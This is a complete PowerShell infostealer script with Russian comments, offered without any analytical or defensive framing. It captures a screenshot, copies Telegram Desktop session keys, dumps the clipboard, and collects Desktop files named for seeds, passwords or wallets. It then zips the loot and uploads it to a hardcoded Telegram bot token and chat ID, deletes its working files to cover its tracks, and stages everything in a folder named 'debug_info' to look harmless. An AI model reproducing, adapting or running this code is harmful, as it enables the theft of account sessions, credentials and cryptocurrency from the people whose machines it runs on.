$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"
$workDir = "$env:TEMP\debug_info"
$zipFile = "$env:TEMP\report.zip"

if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 1. Скриншот (Упрощенный вызов)
try {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $bmp.Save("$workDir\s.png")
    $g.Dispose(); $bmp.Dispose()
} catch { "Screen fail" | Out-File "$workDir\err.txt" }

# 2. Telegram (Только самое важное, без кэша!)
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
    $tgDest = New-Item -ItemType Directory -Path "$workDir\tg" -Force
    # Берем ТОЛЬКО ключи и текущую сессию
    Get-ChildItem $tgPath -File | Where-Object { $_.Name -match "key_datas|settings|D877" } | Copy-Item -Destination $tgDest
    Get-ChildItem $tgPath -Directory | Where-Object { $_.Name.Length -eq 16 } | ForEach-Object {
        Copy-Item $_.FullName -Destination (Join-Path $tgDest $_.Name) -Recurse -Force
    }
}

# 3. Буфер и Сид-фразы
Get-Clipboard | Out-File "$workDir\clip.txt"
$search = Get-ChildItem "$env:USERPROFILE\Desktop" -Recurse -Include *.txt,*.docx -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "seed|pass|wallet" }
$search | Copy-Item -Destination $workDir

# 4. Упаковка
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)

# 5. ОТПРАВКА (через нативный метод PowerShell)
$uri = "https://api.telegram.org/bot$token/sendDocument"
try {
    $form = @{
        chat_id  = $chatId
        document = Get-Item -Path $zipFile
    }
    Invoke-WebRequest -Uri $uri -Method Post -Form $form -ContentType "multipart/form-data"
} catch {
    # Если и так не вышло - пишем ошибку локально для теста
    $_.Exception.Message | Out-File "$env:TEMP\last_error.txt"
}

# Зачистка
Remove-Item $workDir -Recurse -Force
Remove-Item $zipFile -Force
